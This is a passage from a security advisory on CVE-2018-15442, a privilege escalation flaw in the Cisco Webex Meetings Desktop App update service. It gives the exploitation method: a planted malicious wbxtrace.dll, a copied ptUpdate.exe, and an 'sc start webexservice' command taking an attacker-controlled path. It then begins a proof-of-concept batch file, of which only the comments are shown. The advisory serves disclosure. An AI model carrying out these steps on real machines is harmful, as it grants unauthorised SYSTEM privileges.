*7.1. *Privilege Escalation**

[CVE-2018-15442]
The update service of Cisco Webex Meetings Desktop App for Windows does
not properly validate user-supplied parameters. An unprivileged local
attacker could exploit this vulnerability by invoking the update service
command with a crafted argument. This will allow the attacker to run
arbitrary commands with SYSTEM user privileges.

The vulnerability can be exploited by copying to an a local attacker
controller folder, the ptUpdate.exe binary. Also, a malicious dll must
be placed in the same folder, named wbxtrace.dll. To gain privileges,
the attacker must start the service with the command line: sc start
webexservice install software-update 1 "attacker-controlled-path"
(if the parameter 1 doesn't work, then 2 should be used)

Proof of Concept:

/-----
REM Contents of PoC.bat
REM This batch will copy the ptUpdate.exe from the installation folder to the current folder
REM Then it will generate a simple dll that will execute notepad.exe on load. The dll will be created using certutil.exe and named wbxtrace.dll
REM Finally, the webexservice service will be started, with the showed parameters
REM The result should be a notepad.exe with SYSTEM user privileges
